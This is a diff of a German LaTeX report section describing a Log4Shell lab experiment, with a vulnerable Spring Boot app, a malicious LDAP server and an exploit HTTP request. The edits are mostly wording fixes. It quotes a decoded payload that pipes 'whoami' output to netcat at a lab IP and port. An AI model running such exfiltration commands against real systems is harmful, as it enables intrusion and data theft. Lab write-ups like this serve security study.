@@ -3,18 +3,18 @@
 
 \subsubsection{Versuchsaufbau und Exploit}
 Da die Log4j Bibliothek bereits gepatcht ist und auch sämtliche Java Versionen bereits gepatcht wurden,
-wurde im Versuchsaufbau ein Git Repository verwendet.\footfullcite{log4jvulnerableapp} Es beinhaltet eine Java Spring Boot Web Applikation, die noch mit
-einer Java Version läuft, die noch anfällig für Log4shell Angriffe ist.\\
+wurde im Versuchsaufbau ein Git Repository verwendet.\footfullcite{log4jvulnerableapp} Es beinhaltet eine Java Spring Boot Web Applikation, die mit
+einer Java Version läuft, die nach wie vor anfällig für Log4Shell Angriffe ist.\\
 Desweiteren benötigt man einen \gls{ldap}-Server, den man selbst kontrolliert, um einen \gls{jndi}-Lookup zu provozieren. Hierfür verwendet wurde ein weiteres
-Git Repository in dem ein bereits voll konfigurierter Server zur Verfügung gestellt wird. Das Repository wurde jedoch aus GitHub entfernt. Das Kompilat des Schädlichen
+Git Repository in dem ein bereits voll konfigurierter Server zur Verfügung gestellt wird. Das Repository wurde jedoch aus GitHub entfernt. Das Kompilat des schädlichen
 \gls{ldap}-Servers kann nichtsdestotrotz in einem Archiv gefunden werden.\footfullcite{maliciousLdap}\\
-Der letzte Schritt zum erfolgreichen Ausführen des Exploits ist eine HTTP-Anfrage an das Zielsystem zu senden. In der Anfrage muss nun nurnoch die IP-Addrese mit Port angegeben werden
+Der letzte Schritt zum erfolgreichen Ausführen des Exploits ist es, eine \gls{http}-Anfrage an das Zielsystem zu senden. In der Anfrage muss nun nur noch die \gls{ip}-Addrese mit Port angegeben werden
 unter denen der \gls{ldap}-Server erreichbar ist.
 \input{listings/final-exploit-req}
 \bigskip
 
-Bei der Durchführung des Exploits wurde die Base64 Funktionalität des bereits laufenden \gls{ldap}-Servers verwendet. Daher liegt das auszuführende Skript als base64-encoded String vor. Die Befehle,
-die hier der Reihe nach ausgeführt werden sind übersetzt: \textit{bin/bash | whoami | nc 192.168.186.216 9999}\\
+Bei der Durchführung des Exploits wurde die Base64 Funktionalität des bereits laufenden \gls{ldap}-Servers verwendet. Daher liegt das auszuführende Skript als base64-encoded String vor. Die \gls{bash} Befehle,
+die hier der Reihe nach ausgeführt werden sind übersetzt: \textit{bin/bash | whoami | nc 192.168.186.216 9999}.\\
 Die tatsächliche Funktionalität des Skripts konnte jedoch hierbei nicht Revers Engineert werden. Ein eigener Ansatz einer solchen Base64 Funktionalität wäre der Folgende:\\
 \input{listings/Log4j-malware}
 
